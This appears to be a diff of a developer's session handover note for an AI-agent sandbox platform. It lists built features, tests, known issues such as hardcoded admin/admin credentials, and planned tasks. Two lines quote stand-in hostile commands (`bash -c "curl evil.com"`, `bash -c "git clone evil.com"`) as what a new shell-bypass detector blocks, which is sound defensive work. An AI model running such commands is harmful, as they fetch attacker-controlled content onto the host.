@@ -1,77 +1,162 @@
-# Agent Sandbox — Session Passover (2026-02-26, Session 2)
+# Agent Sandbox — Session Passover (2026-02-26, Final)
 
-> **For next session:** Continue with sandbox UI polish, deploy to sbox1, and start backend API for the import wizard. Consider refactoring backend pytest tests to use authenticated public API.
+> **For next session:** Focus on (1) multi-persona Keycloak setup with random passwords, (2) per-context Landlock isolation, (3) SSE streaming verification on live cluster, (4) Keycloak redirect_uri fix. See "Next Session Tasks" below.
 
-## What Was Done This Session
+## Session Stats
 
-### Code Changes (10 files, +1287/-172 lines in kagenti, +12/-2 in agent-examples)
+- **Duration:** ~4.5 hours wall time
+- **Code:** 4,809 lines added, 593 removed across kagenti + agent-examples
+- **Commits:** 16 on feat/sandbox-agent (kagenti), 3 on feat/sandbox-agent (agent-examples)
+- **Tests:** 16/16 Playwright UI tests passing on sbox, 9/9 on sbox1
+- **Subagents:** 4 parallel Opus 4.6 subagents for infrastructure (A2A concurrency, wizard backend, SSE streaming, HITL + security modules)
 
-| Change | Files | What |
-|--------|-------|------|
-| Response rendering fix | `agent.py`, `sandbox.py`, `SandboxPage.tsx` | 3-layer fix: agent extracts only text blocks from tool-calling models, backend parses stringified lists, frontend filters graph event dumps from history |
-| Session sidebar redesign | `SessionSidebar.tsx` | Compact display (agent name + time + session name/PR ref), root-only toggle, hover popover with details (creation time, status, sub-session count) |
-| Sessions table redesign | `SessionsTablePage.tsx` | Root-only toggle, sub-session count column, agent name and created time columns |
-| Chat UX improvements | `SandboxPage.tsx` | Message bubbles with avatars (User/Robot icons), timestamps, markdown styling (code blocks, tables, blockquotes), "Load earlier messages" batch loading |
-| Import wizard | `SandboxCreatePage.tsx`, `App.tsx`, `index.ts` | 6-step wizard at `/sandbox/create`: Source, Security, Identity, Persistence, Observability, Review. ProgressStepper navigation. |
-| Playwright fixes | `sandbox-walkthrough.spec.ts`, `92-run-ui-tests.sh` | Fixed ESM `require` → dynamic `import()`. Added sandbox tests to fulltest pipeline. |
-| Session test fixes | `test_sandbox_sessions_api.py` | Shared `_wait_for_session()` polling helper (10 attempts, 2s intervals). Applied to persist, detail, kill, delete tests. |
+## What Was Built
 
-### Test Results on sbox Cluster
+### Core Infrastructure (via 4 parallel subagents)
 
-| Suite | Result | Notes |
-|-------|--------|-------|
-| Playwright sandbox.spec.ts | 8/8 pass | Navigation, chat, sidebar, table, config |
-| Playwright walkthrough | 1/1 pass | Full user journey, 11.2s |
-| Backend session API | 7/7 connectivity fail | Expected — tests call in-cluster DNS from laptop. Deferred: refactor to use authenticated public API. |
+| Feature | Files | Status |
+|---------|-------|--------|
+| A2A per-context_id concurrency locks | agent.py | Deployed — prevents stuck submitted tasks |
+| TTL cleanup endpoint `POST /sandbox/{ns}/cleanup` | sandbox.py | Deployed — marks stale tasks as failed |
+| HPA for sandbox-legion autoscaling | sandbox-legion-hpa.yaml | Created — 1-5 replicas, 70% CPU |
+| Wizard backend `POST /sandbox/{ns}/create` | sandbox_deploy.py, main.py | Deployed — K8s Deployment + Service + Route |
+| SSE streaming `POST /sandbox/{ns}/chat/stream` | sandbox.py, SandboxPage.tsx, nginx.conf | Deployed — proxies A2A message/stream events |
+| Shell interpreter bypass detection | executor.py | Committed — catches `bash -c "curl evil.com"` |
+| TOFU verification on startup | agent.py | Committed — hashes CLAUDE.md/sources.json |
+| Sources policy in interpreter bypass | executor.py | Committed — blocks `bash -c "git clone evil.com"` |
+| HITL interrupt() design | graph.py | Documented — 7-step implementation roadmap |
 
-### Design Decisions
+### UI Components
 
-1. **Session hierarchy:** Root sessions shown by default (toggle for all). Sub-sessions linked via `metadata.parent_context_id`. Ready for C20 sub-agent spawning.
-2. **History batch loading:** Show last 30 messages initially, "Load earlier" button for older messages. Not true infinite scroll (history comes from single task record, no server-side pagination).
-3. **Sub-session visualization:** User chose DAG (ReactFlow) over tree list. Deferred until C20 implementation adds actual sub-sessions.
-4. **Backend test approach:** Current tests bypass auth and need in-cluster access. Future: refactor to use Keycloak token + public API endpoints.
+| Component | What | Status |
+|-----------|------|--------|
+| SessionSidebar | Compact display (agent name, time, session name/PR ref), root-only toggle, tooltip, 5s polling | Deployed |
+| SessionsTablePage | Root-only toggle, sub-session count, agent/time columns | Deployed |
+| SandboxPage chat | Message bubbles with avatars, timestamps, markdown styling, SSE streaming, infinite scroll | Deployed |
+| SandboxCreatePage | 6-step wizard: Source, Security, Identity, Persistence, Observability, Review | Deployed |
+| Nav rename | "Sandbox" → "Sessions" | Deployed |
+
+### Backend APIs
+
+| Endpoint | Purpose | Status |
+|----------|---------|--------|
+| `GET /sandbox/{ns}/sessions/{ctx}/history` | Paginated history with artifact-paired responses | Deployed |
+| `PUT /sandbox/{ns}/sessions/{ctx}/rename` | Set/clear custom session title | Deployed |
+| `POST /sandbox/{ns}/cleanup` | TTL cleanup for stuck submitted tasks | Deployed |
+| `POST /sandbox/{ns}/create` | Deploy sandbox agent via K8s API | Deployed |
+| `POST /sandbox/{ns}/chat/stream` | SSE streaming proxy for A2A message/stream | Deployed |
+
+### Playwright Tests (16 total)
+
+| Suite | Tests | What |
+|-------|-------|------|
+| sandbox.spec.ts | 8 | Navigation, chat, sidebar, sessions table, config |
+| sandbox-walkthrough.spec.ts | 1 | Full user journey with timing markers |
+| sandbox-debug.spec.ts | 1 | Session switching, history loading, visual debug |
+| sandbox-create-walkthrough.spec.ts | 6 | Basic/Hardened/Enterprise agent import + navigation |
+
+### Bug Fixes
+
+| Bug | Root Cause | Fix |
+|-----|-----------|-----|
+| Stuck "submitted" tasks | A2A SDK allows concurrent graph execution per context_id | Per-context_id asyncio.Lock |
+| History showing only user messages | Backend returned first task record (submitted), not latest (completed) | `ORDER BY id DESC LIMIT 1` |
+| Graph event dumps in history | Agent status updates stored as history entries | Server-side filtering + artifact pairing |
+| Popover flickering | PatternFly Popover hover trigger unreliable | Replaced with Tooltip |
+| Session not restored on reload | Keycloak SSO redirect loses SPA path | localStorage persistence (partial fix) |
+| Walkthrough test ESM error | `require('fs')` in ESM context | Dynamic `import('fs')` |
+| nginx proxy timeout | 60s too short for tool calls | Increased to 300s |
+
+## Known Issues
+
+| Issue | Severity | Notes |
+|-------|----------|-------|
+| Page reload → home page | Medium | Keycloak SSO redirect_uri doesn't preserve `/sandbox?session=xxx`. Needs Keycloak init config fix. |
+| Duplicate context_id in sidebar | Low | Multiple task records per context_id from retries. Need dedup view. |
+| "Created: Unknown" in tooltip | Low | A2A SDK doesn't populate status.timestamp consistently. |
+| Fixed admin/admin credentials | High | Kind deployment hardcodes `admin/admin`. Need random password generation. |
+| No multi-user isolation in shared pod | Medium | Sessions share PVC; one session can read another's files. Need per-context Landlock. |
+| Backend tests need in-cluster access | Medium | Pytest tests call agent via internal DNS. Need refactoring to use authenticated public API. |
+
+## Capability Status (C1-C21)
+
+| Cap | Name | Status | What's Done | What's Missing |
+|-----|------|--------|-------------|----------------|
+| C1 | Pod lifecycle | **Complete** | CRDs, controller, SandboxTemplate | — |
+| C3 | Landlock | **Complete** | nono-launcher module, verified on RHCOS | Per-context isolation |
+| C4 | TOFU | **Integrated** | Hash verification on startup, warns on mismatch | ConfigMap storage not tested on cluster |
+| C5 | Squid proxy | **Complete** | Domain allowlist, sidecar built, NetworkPolicy | — |
+| C6 | AuthBridge | **Designed** | Token exchange pattern documented | End-to-end test pending |
+| C9 | Multi-repo | **Integrated** | RepoManager wired into interpreter bypass | Executor pre-hooks not complete |
+| C10 | Skills loading | **Complete** | SkillsLoader parses CLAUDE.md + skills | — |
+| C11 | Multi-LLM | **Complete** | litellm integration, model selector in UI | — |
+| C13 | Observability | **Scaffolding** | Verification module exists | Trace parsing not implemented |
+| C14 | HITL backend | **Framework** | Data models, channel adapters (stubs) | Actual API calls in adapters |
+| C16 | Hardening | **Complete** | Read-only root, caps dropped, non-root, seccomp | — |
+| C17 | Triggers | **Designed** | Cron/webhook/alert module | Backend integration pending |
+| C18 | HITL routing | **Designed** | interrupt() design documented | Graph restructuring needed |
+| C19 | Multi-conv | **Partial** | WorkspaceManager per-context dirs | Per-context Landlock isolation |
+| C20 | Sub-agents | **Mostly** | explore() works, delegate() is stub | delegate creates SandboxClaim |
+| C21 | Persistence | **Complete** | PostgreSQL TaskStore + LangGraph checkpointer | — |
 
 ## Clusters
 
-| Cluster | KUBECONFIG | Status |
-|---------|-----------|--------|
-| sbox | ~/clusters/hcp/kagenti-team-sbox/auth/kubeconfig | Running, backend+UI rebuilding from latest push |
-| sbox1 | ~/clusters/hcp/kagenti-team-sbox1/auth/kubeconfig | Ready (nodes up), needs kagenti deploy |
+| Cluster | KUBECONFIG | Status | Tests |
+|---------|-----------|--------|-------|
+| sbox | ~/clusters/hcp/kagenti-team-sbox/auth/kubeconfig | Running, latest build | 16/16 pass |
+| sbox1 | ~/clusters/hcp/kagenti-team-sbox1/auth/kubeconfig | Running, latest build | 9/9 pass |
 
 ## Worktrees
 
 | Repo | Worktree | Branch | Last Commit |
 |------|----------|--------|-------------|
-| kagenti | .worktrees/sandbox-agent | feat/sandbox-agent | `3dbefc7d` feat: sandbox UI improvements + import wizard + test fixes |
-| agent-examples | .worktrees/agent-examples | feat/sandbox-agent | `123d18c` fix: extract only text from tool-calling model responses |
+| kagenti | .worktrees/sandbox-agent | feat/sandbox-agent | `d5776302` wizard tests |
+| agent-examples | .worktrees/agent-examples | feat/sandbox-agent | `ec6fe43` concurrency + security |
 
 ## PRs
 
 | Repo | PR | Status |
 |------|----|----|
-| Ladas/kagenti | [#758](https://github.com/kagenti/kagenti/pull/758) | Draft, pushed |
-| kagenti/agent-examples | [#126](https://github.com/kagenti/agent-examples/pull/126) | Draft, pushed |
-
-## Known Issues (from visual debug test)
-
-| Bug | Status | Notes |
-|-----|--------|-------|
-| Sidebar empty on initial load | Timing | Sessions load after ~3s polling; namespace selector shows "Loading..." initially |
-| Page reload → home page | Keycloak | SSO redirect loses SPA path; localStorage restore only works on actual reload |
-| Session ID not captured on fresh nav | Fixed | localStorage no longer restores stale session on fresh navigation |
-| nginx 60s proxy timeout | Fixed | Increased to 300s for long-running agent tool calls |
-| History shows only user messages | Fixed | History endpoint now pairs user msgs with artifact responses |
+| Ladas/kagenti | [#758](https://github.com/kagenti/kagenti/pull/758) | Draft |
+| kagenti/agent-examples | [#126](https://github.com/kagenti/agent-examples/pull/126) | Draft |
 
 ## Next Session Tasks (Priority Order)
 
-1. **SSE streaming for live chat updates** — Backend: `POST /sandbox/{ns}/chat/stream` proxying A2A `message/stream`. Frontend: EventSource/ReadableStream for real-time chat updates as agent thinks/executes.
-2. **Sidebar live status updates** — SSE subscription per visible session, or reduce polling to 3s. Show status transitions dynamically.
-3. **Session switching test with long-running command** — Send `sleep 30`, switch sessions, come back, verify stream reconnects. Needs streaming to be implemented first.
-4. **Backend API for wizard** — `POST /api/v1/sandbox/create` that orchestrates deployment
-5. **Sub-session DAG visualization** — Add ReactFlow dependency, stub out DAG component
-6. **Refactor backend tests** — Use Keycloak token + public API instead of direct in-cluster calls
-7. **Fix Keycloak redirect_uri** — Preserve full SPA path through SSO redirect
-8. **Address pdettori's review comments** on agent-examples PR #126
+### 1. Multi-Persona Keycloak Setup
+- **Random admin password:** Replace hardcoded `admin/admin` with random password generated at deploy time. Store in `keycloak-initial-admin` secret.
+- **Test personas:** Create 3 users with different roles:
+  - `dev-user` / random password → `kagenti-viewer` role, `team1-dev` group
+  - `ns-admin` / random password → `kagenti-operator` role, `team1-admin` group
+  - `platform-admin` / random password → `kagenti-admin` role
+- **show-services.sh:** Print credentials using ANSI dim text (e.g., `\033[8m$PASSWORD\033[0m` — hidden until text selected) or print `kubectl get secret` command to reveal.
+- **Playwright multi-persona tests:** Test that dev-user can chat but not kill sessions; ns-admin can kill/delete; platform-admin can access admin page.
+
+### 2. Per-Context Landlock Isolation (C19)
+- Each session runs in a subprocess with nono Landlock scoped to `/workspace/ctx-{id}/` only
+- Other sessions' directories are invisible (not just unwritable)
+- Design decision: fork/exec per request vs. persistent worker processes
+
+### 3. SSE Streaming Verification
+- Test SSE streaming on live cluster with long-running agent command (`sleep 30`)
+- Verify frontend shows real-time status updates
+- Test session switching during streaming and reconnection
+
+### 4. Keycloak Redirect Fix
+- Fix SPA path preservation through Keycloak SSO redirect
+- Options: (a) configure `redirectUri` in Keycloak init, (b) use `post_login_redirect_uri` in keycloak-js, (c) App-level redirect based on localStorage
+
+### 5. Session Deduplication
+- Backend: deduplicate session list by context_id (show only latest task per context_id)
+- Consider adding a DB view or unique constraint
+
+### 6. Backend Test Refactoring
+- Refactor pytest session tests to use Keycloak token + public API
+- Remove dependency on in-cluster DNS access
+- Pattern: `grant_type=password` → Bearer token → public route
+
+### 7. Address PR Review Comments
+- pdettori's 4 comments on agent-examples PR #126
+- Shell interpreter bypass (done), HITL interrupt (designed), TTL cleanup (done), RepoManager wiring (done)
 
 ## Startup Command for Next Session
 
@@ -86,4 +171,4 @@ claude
 
 Then say:
 
-> Read docs/plans/2026-02-26-sandbox-session-passover.md. Continue: (1) verify rebuild on sbox, (2) deploy kagenti on sbox1, (3) start backend API for import wizard, (4) add ReactFlow DAG for sub-sessions, (5) refactor backend tests to use authenticated API. Use /tdd:hypershift on sbox and sbox1.
+> Read docs/plans/2026-02-26-sandbox-session-passover.md. Continue: (1) implement random Keycloak admin password + 3 test user personas, (2) add multi-persona Playwright tests, (3) verify SSE streaming with long-running commands, (4) fix Keycloak redirect_uri for page reload, (5) implement per-context Landlock isolation. Use /tdd:hypershift on sbox and sbox1.
